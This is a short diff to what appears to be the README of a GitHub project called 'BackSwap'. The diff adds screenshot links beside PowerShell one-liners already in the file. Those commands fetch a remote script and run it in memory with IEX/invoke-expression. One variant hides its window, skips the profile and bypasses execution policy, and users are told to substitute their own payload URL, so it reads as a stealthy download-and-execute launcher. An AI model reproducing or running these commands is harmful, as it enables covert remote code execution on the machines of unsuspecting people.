@@ -17,6 +17,9 @@ EXAMPLE
 
 powershell -command IEX(IWR https://raw.githubusercontent.com/VBV11/BackSwap/main/BS.ps1)
 
+![image](https://github.com/VBV11/BackSwap/assets/104235290/f632c341-f864-4334-8fa3-96970affdc9e)
+
+
 Run box command
 
 (Change the URL to ur own URL of the code) powershell -w h -NoP -NonI -Exec Bypass $pl = iwr URL?dl=1; invoke-expression $pl
@@ -25,5 +28,6 @@ EXAMPLE
 
 powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/VBV11/BackSwap/main/BS.ps1?dl=1; invoke-expression $pl
 
+![image](https://github.com/VBV11/BackSwap/assets/104235290/e79c7083-6a1a-432f-aa79-9c666d991143)
 
 
